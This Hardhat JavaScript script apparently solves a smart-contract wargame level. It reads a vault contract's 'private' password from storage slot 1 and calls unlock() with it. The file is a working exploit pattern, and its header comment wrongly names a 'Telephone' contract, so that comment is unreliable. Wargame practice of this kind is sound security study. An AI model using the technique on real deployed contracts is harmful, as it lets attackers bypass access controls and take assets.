// vault.js - Exploits the Telephone contract

// Import statements
require("dotenv").config();
const { ethers } = require("hardhat");
const { vaultAddress, vaultAbi } = require("../contracts");

async function main() {
  // Get ethers signer and contract instances
  const provider = ethers.provider;
  const account = await ethers.getSigner();
  const vault = new ethers.Contract(vaultAddress, vaultAbi, provider);
  const vaultSigner = vault.connect(account);

  console.log("Running exploit...")
  // Read the storage data at slot 1 to get the password
  console.log("Getting password from storage...");
  let password = await provider.getStorageAt(vaultAddress, 1);
  console.log("Password is:", password);

  // Send a transaction to the unlock method with the password
  console.log("Unlocking vault...")
  let unlockTxn = await vaultSigner.unlock(password);
  await unlockTxn.wait();

  // Confirm exploit 
  let locked = await vaultSigner.locked();
  console.log("Vault is locked:", locked);

  console.log("Exploit completed.")

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });